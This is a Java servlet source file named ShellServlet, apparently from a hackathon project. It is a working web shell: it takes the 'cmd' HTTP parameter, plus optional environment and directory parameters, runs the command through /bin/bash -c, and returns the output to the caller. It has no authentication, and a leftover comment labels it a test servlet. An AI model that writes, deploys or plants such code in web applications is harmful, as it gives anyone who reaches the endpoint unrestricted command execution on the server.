package com.vargadaniel.hackathon.servlet;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.vargadaniel.hackathon.util.HackUtil;

/**
 * Servlet implementation class TestServlet
 */
public class ShellServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;

    /**
     * Default constructor. 
     */
    public ShellServlet() {
    }

	@Override
	protected void service(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
		java.util.List<String> commandList = new ArrayList<String>();
		commandList.add("/bin/bash");
		commandList.add("-c");
		String[] commandInput = req.getParameterValues("cmd");
		commandList.addAll(Arrays.asList(commandInput));
		String[] envp = req.getParameterValues("envp");
		String dirPath = req.getParameter("dir");
		File dir = null;
		if (dirPath != null) {
			dir = new File(dirPath);
		}
		String output = HackUtil.runProcess(commandList.toArray(new String[0]), envp, dir);
		res.getWriter().println(output);
		res.getWriter().flush();
	}


}
